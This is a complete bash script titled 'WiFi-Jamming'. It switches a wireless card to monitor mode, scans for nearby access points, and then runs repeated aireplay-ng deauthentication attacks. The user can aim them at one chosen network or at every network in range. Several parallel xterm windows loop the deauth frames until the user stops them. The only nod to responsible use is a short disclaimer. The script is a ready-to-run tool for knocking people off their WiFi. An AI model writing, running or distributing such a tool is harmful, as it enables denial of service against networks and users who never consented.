#!/bin/bash

zenity --info --title=" Welcome" \
  --text="🛠️  Tool: WiFi-Jamming\n👤 Author: Raef\n\n⚠️  I'm not responsible for any missuse .\nUse responsibly."

# Privilege Check
if [[ $EUID -ne 0 ]]; then 
    zenity --error --text="❌ Root access is required. Run this script as root."
    exit 1
fi

# Dependencies
for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig; do
  if ! command -v "$cmd" &>/dev/null; then 
    zenity --error --text="❌ Missing dependency: $cmd"
    exit 1
  fi
done

RED="\e[31m"; GREEN="\e[32m"; CYAN="\e[36m"; YELLOW="\e[33m";
PURPLE="\e[35m"; BLUE="\e[34m"; RESET="\e[0m"; BOLD="\e[1m"

attack_animation() {
    local i=0
    local frames=("💥" "🔥" "⚡" "💣")
    while true; do
        printf "\r${RED}${BOLD}%s ATTACK IN PROGRESS ${PURPLE}%s${RESET}" "${frames[$i]}" "${frames[$i]}"
        i=$(((i+1) % 4))
        sleep 0.3
    done
}

# Interface selection
mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
[[ ${#interfaces[@]} -eq 0 ]] && zenity --error --text="❌ No wireless interfaces found." && exit 1

iface=$(zenity --list --title="📡 Select Interface" --text="Choose an interface for monitor mode" --column="Interfaces" "${interfaces[@]}")
[[ -z "$iface" ]] && exit 1

# Enable monitor mode
airmon-ng check kill &>/dev/null
ip link set "$iface" down
iw dev "$iface" set type monitor
ip link set "$iface" up
iw dev "$iface" set power_save off

# Scan
scan_file="scan_$(date +%s)"
zenity --info --text="📡 Scanning networks (10 seconds)..."
xterm -T "WiFi Scan" -geometry 100x30 -e "timeout 10s airodump-ng --write $scan_file --output-format csv $iface" &
sleep 12

csv_file="${scan_file}-01.csv"
[[ ! -f "$csv_file" ]] && zenity --error --text="❌ No networks found." && exit 1

mapfile -t aps < <(awk -F',' 'NR > 1 && $1 ~ /^[0-9A-F:]{17}$/ && $14 != "" {
  gsub(/^ +| +$/, "", $1); gsub(/^ +| +$/, "", $4); gsub(/^ +| +$/, "", $14);
  print $1 "|" $4 "|" $14
}' "$csv_file")

[[ ${#aps[@]} -eq 0 ]] && zenity --error --text="❌ No viable APs found." && exit 1

# Build list for GUI
ap_display=()
for i in "${!aps[@]}"; do
  IFS='|' read -r bssid channel essid <<< "${aps[$i]}"
  ap_display+=("[$i] CH:$channel | ESSID:$essid | BSSID:$bssid")
done

# Attack mode
mode=$(zenity --list --radiolist --title="⚔️ Select Attack Mode" --text="Choose attack type" \
  --column="Select" --column="Mode" TRUE "Global Attack (all networks)" FALSE "Targeted Attack (single network)")

[[ -z "$mode" ]] && exit 1

# Target selection
if [[ "$mode" == "Targeted Attack (single network)" ]]; then
  target=$(zenity --list --title="🎯 Select Target" --text="Choose a network" --column="Networks" "${ap_display[@]}")
  [[ -z "$target" ]] && exit 1
  index=$(echo "$target" | grep -oP '\[\K[0-9]+')
  selected=("${aps[$index]}")
else
  selected=("${aps[@]}")
fi

# Confirm
zenity --question --text="Ready to start attack?" || exit 1

# Cleanup function
cleanup() {
  killall aireplay-ng xterm &>/dev/null
  ip link set "$iface" down
  iw dev "$iface" set type managed
  ip link set "$iface" up
  service NetworkManager restart &>/dev/null
  rm -f "$csv_file" "$scan_file"-*
  zenity --info --title="Session Ended" --text=" Network restored.you are Good to go.\n\n  by Raef"
  exit 0
}
trap cleanup INT

# Attack loop
attack_animation & attack_pid=$!

for ap in "${selected[@]}"; do
  IFS='|' read -r bssid channel essid <<< "$ap"
  iw dev "$iface" set channel "$channel"
  for i in {1..5}; do
    xterm -geometry 100x15 -bg black -fg red -T "⚡ ATTACKING $essid ⚡" \
      -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid $iface; sleep 1; done" &
    sleep 0.2
  done
  zenity --info --ok-label="🛑 Stop" --title="Attack Running" \
    --text="💥 Attacking $essid\nClick 'Stop' to end the attack."
  kill $attack_pid
  cleanup
  break
done
#by raef
